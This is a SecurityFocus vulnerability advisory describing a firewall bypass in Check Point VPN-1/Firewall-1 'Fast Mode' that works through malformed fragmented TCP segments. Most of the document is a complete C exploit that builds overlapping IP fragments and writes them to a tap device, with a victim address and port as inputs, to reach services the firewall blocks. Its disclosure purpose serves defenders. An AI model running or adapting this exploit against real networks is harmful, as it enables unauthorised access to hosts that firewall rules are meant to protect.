source: http://www.securityfocus.com/bid/2143/info

Check Point Software's VPN-1 and Firewall-1 products contain a vulnerability in their "Fast Mode" option that may allow an attacker to bypass access control restrictions and access certain blocked services. Fast Mode is a setting that turns off analysis of packets in tcp sessions after the TCP 3-way handshake has completed for speed-crtitical services.

If this setting is enabled on a firewall, it may be possible for a remote attacker to access blocked services on the host protected by the firewall using fastmode. It is also reportedly possible to access hosts at least one hop away on the same interface as the target host being protected.

In order for this to be possible, at least one TCP service on a host protected by the firewall must be accessible by the attacker to which a SYN can be sent legitimately. The vulnerability is due to a failure to handle malformed fragmented TCP segments.

This vulnerability may allow attackers to access vulnerable services normally protected by the firewall ruleset.

Check Point Software contacted SecurityFocus with an update regarding this issue. Check the solutions section for the update.

#define _BSD_SOURCE

#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

struct pseudo {
  unsigned long source;
  unsigned long dest;
  unsigned char zero;
  unsigned char proto;
  unsigned short len;
};

/*
 *      -------------------- config --------------------
 */

static char tap_device[] = "/dev/tap0";

static char local_ip_addr[] = "172.16.0.1";

static unsigned char dst_mac_addr[] = {
  0xfe, 0xfd, 0x00, 0x00, 0x00, 0x00
};

static int num_hops = 1;

/*
 *     ------------------------------------------------
 */

static void hex_dump(unsigned char *buff, int len)
{
  int i, k;

  for (i = 0; i < len; i += k) {
    printf("%.4x: ", i);
    for (k = 0; i + k < len && k < 16; k++)
      printf("%.2x ", buff[i + k]);
    while (k++ < 16)
      printf("   ");
    for (k = 0; i + k < len && k < 16; k++)
      if (buff[i + k] >= 32 && buff[i + k] <= 126)
	printf("%c", buff[i + k]);
      else
	printf(".");
    printf("\n");
  }
}

int full_write(int f, char *data, int len)
{
  int res;

  while (len > 0) {
    if ((res = write(f, data, len)) < 0)
      return res;
    len -= res;
    data += res;
  }

  return 0;
}

static u_short calc_sum(u_short start, u_short *buff, int bytelen)
{
  u_long sum = start;
  u_short last = 0;
  int wordlen;

  wordlen = bytelen / 2;
  bytelen &= 1;

  while (wordlen--)
    sum += *buff++;

  if (bytelen) {
    *((u_char *)&last) = *((u_char *)buff);
    sum += last;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum = (sum >> 16) + (sum & 0xffff);

  return sum;
}

static void usage()
{
  fprintf(stderr, "usage: frag v-addr f-port o-port v-port\n");
}

int main(int ac, char *av[])
{
  int t;
  unsigned char dgram[136];
  struct ether_header eh;
  unsigned char iph_buff[60];
  struct ip *iph;
  unsigned char tcph_buff[60];
  struct tcphdr *tcph;
  unsigned long la, va;
  unsigned short fp, op, vp;
  struct pseudo ph;
  unsigned short fid;

  if (ac != 5) {
    usage();
    return 1;
  }

  if ((va = inet_addr(av[1])) == (unsigned long)-1) {
    fprintf(stderr, "invalid victim address given\n");
    usage();
    return 1;
  }

  if (!(fp = htons(atoi(av[2])))) {
    fprintf(stderr, "invalid fastmode port given\n");
    usage();
    return 1;
  }

  if (!(op = htons(atoi(av[3])))) {
    fprintf(stderr, "invalid open port given\n");
    usage();
    return 1;
  }

  if (!(vp = htons(atoi(av[4])))) {
    fprintf(stderr, "invalid victim port given\n");
    usage();
    return 1;
  }

  la = inet_addr(local_ip_addr);

  fid = (unsigned short)getpid();

  iph = (struct ip *)iph_buff;
  tcph = (struct tcphdr *)tcph_buff;

  if ((t = open(tap_device, O_RDWR)) < 0) {
    perror("open");
    return 2;
  }

  /*
   *      -------------------- PACKET #1 --------------------
   */

  ph.source = la;
  ph.dest = va;
  ph.zero = 0;
  ph.proto = IPPROTO_TCP;
  ph.len = htons(20);

  tcph->th_sport = fp;
  tcph->th_dport = vp;
  tcph->th_seq = htonl(0x19711219);
  tcph->th_ack = htonl(0x19720201);
  tcph->th_x2 = 0;
  tcph->th_off = 5;
  tcph->th_win = htons(16384);
  tcph->th_urp = htons(0);

  tcph->th_flags = TH_SYN;

  /*
   *      Must be the "with SYN" checksum. The ACK will be overwritten
   *      by the second packet.
   */

  tcph->th_sum = 0;
  tcph->th_sum = ~calc_sum(calc_sum(0, (u_short *)&ph, 12),
			  (u_short *)tcph, ntohs(ph.len));

  tcph->th_flags = TH_ACK;

  iph->ip_v = IPVERSION;
  iph->ip_tos = 0;
  iph->ip_id = htons(fid);
  iph->ip_ttl = 64;
  iph->ip_p = IPPROTO_TCP;
  iph->ip_src.s_addr = la;
  iph->ip_dst.s_addr = va;

  memcpy(eh.ether_dhost, dst_mac_addr, 6);
  memset(eh.ether_shost, 0, 6);
  eh.ether_type = htons(ETHERTYPE_IP);

  dgram[0] = dgram[1] = 0;
  memcpy(dgram + 2, &eh, 14);

  /*
   *      ---------- Fragment #1 ----------
   */

  iph->ip_hl = 5;
  iph->ip_len = htons(28);
  iph->ip_off = htons(IP_MF);
  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 20);

  memcpy(dgram + 16, iph_buff, 20);
  memcpy(dgram + 36, tcph_buff, 8);

  hex_dump(dgram, 44); printf("\n");

  if (full_write(t, dgram, 44) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      ---------- Fragment #2 ----------
   */

  iph->ip_hl = 6;
  iph->ip_len = htons(32);
  iph->ip_off = htons(1 | IP_MF);

  iph_buff[20] = 68;
  iph_buff[21] = 4;
  iph_buff[22] = 5;
  iph_buff[23] = (15 - num_hops) << 4;

  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 24);

  memcpy(dgram + 16, iph_buff, 24);
  memcpy(dgram + 40, tcph_buff + 8, 8);

  hex_dump(dgram, 48); printf("\n");


  if (full_write(t, dgram, 48) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      ---------- Fragment #3 ----------
   */

  iph->ip_hl = 6;
  iph->ip_len = htons(28);
  iph->ip_off = htons(2);

  iph_buff[20] = 1;
  iph_buff[21] = 1;
  iph_buff[22] = 1;
  iph_buff[23] = 1;

  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 24);

  memcpy(dgram + 16, iph_buff, 24);
  memcpy(dgram + 40, tcph_buff + 16, 4);

  hex_dump(dgram, 44); printf("\n");

  if (full_write(t, dgram, 44) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      -------------------- PACKET #2 --------------------
   */

  getchar();

  tcph->th_sport = htons(1024);
  tcph->th_dport = op;
  tcph->th_flags = TH_SYN;

  /*
   * But then again, the fragment with the checksum will be dropped anyway...
   */

  tcph->th_sum = 0;
  tcph->th_sum = ~calc_sum(calc_sum(0, (u_short *)&ph, 12),
			  (u_short *)tcph, ntohs(ph.len));

  /*
   *      ---------- Fragment #1 ----------
   */

  iph->ip_hl = 5;
  iph->ip_len = htons(28);
  iph->ip_off = htons(IP_MF);
  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 20);

  memcpy(dgram + 16, iph_buff, 20);
  memcpy(dgram + 36, tcph_buff, 8);

  hex_dump(dgram, 44); printf("\n");

  if (full_write(t, dgram, 44) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      ---------- Fragment #2 ----------
   */

  iph->ip_hl = 6;
  iph->ip_len = htons(32);
  iph->ip_off = htons(1 | IP_MF);

  iph_buff[20] = 1;
  iph_buff[21] = 1;
  iph_buff[22] = 1;
  iph_buff[23] = 1;

  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 24);

  memcpy(dgram + 16, iph_buff, 24);
  memcpy(dgram + 40, tcph_buff + 8, 8);

  hex_dump(dgram, 48); printf("\n");


  if (full_write(t, dgram, 48) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      ---------- Fragment #3 ----------
   */

  iph->ip_hl = 6;
  iph->ip_len = htons(28);
  iph->ip_off = htons(2);

  iph_buff[20] = 68;
  iph_buff[21] = 4;
  iph_buff[22] = 5;
  iph_buff[23] = (15 - num_hops) << 4;

  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 24);

  memcpy(dgram + 16, iph_buff, 24);
  memcpy(dgram + 40, tcph_buff + 16, 4);

  hex_dump(dgram, 44); printf("\n");

  if (full_write(t, dgram, 44) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  close(t);

  return 0;
}
